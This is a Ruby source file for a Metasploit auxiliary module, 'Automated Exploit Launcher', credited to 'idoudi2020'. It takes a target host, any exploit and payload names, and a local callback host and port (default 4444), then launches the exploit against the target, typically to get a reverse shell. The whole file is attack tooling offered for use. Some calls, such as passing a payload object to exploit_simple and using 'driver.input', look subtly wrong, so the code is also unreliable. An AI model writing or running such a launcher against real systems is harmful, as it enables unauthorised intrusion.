require 'msf/core'

class MetasploitModule < Msf::Auxiliary

  def initialize(info = {})
    super(update_info(info,
      'Name'        => 'Automated Exploit Launcher',
      'Description' => %q{
        This module automatically launches a chosen exploit with a specified payload against a target system.
      },
      'Author'      => [ 'idoudi2020' ],
      'License'     => MSF_LICENSE
    ))

    register_options([
      Opt::RHOST(),
      OptString.new('EXPLOIT', [ true, 'The exploit module to use' ]),
      OptString.new('PAYLOAD', [ true, 'The payload to use' ]),
      OptString.new('LHOST', [ true, 'Local IP address for payload' ]),
      OptInt.new('LPORT', [ true, 'Local port for payload', 4444 ])
    ])
  end

  def run
    rhost = datastore['RHOST']
    exploit_name = datastore['EXPLOIT']
    payload_name = datastore['PAYLOAD']
    lhost = datastore['LHOST']
    lport = datastore['LPORT']

    print_status("Launching exploit #{exploit_name} against #{rhost} with payload #{payload_name}")

    begin
      exploit = framework.exploits.create(exploit_name)
      payload = framework.payloads.create(payload_name)

      if exploit.nil? || payload.nil?
        print_error("Failed to load exploit or payload. Check the names and try again.")
        return
      end

      exploit.datastore['RHOST'] = rhost
      exploit.datastore['PAYLOAD'] = payload_name

      payload.datastore['LHOST'] = lhost
      payload.datastore['LPORT'] = lport

      print_status("Configuring exploit and payload...")

      exploit.exploit_simple(
        'Payload'        => payload,
        'LocalInput'     => driver.input,
        'LocalOutput'    => driver.output
      )

      print_good("Exploit launched successfully!")
    rescue => e
      print_error("An error occurred: #{e.message}")
    end
  end
end
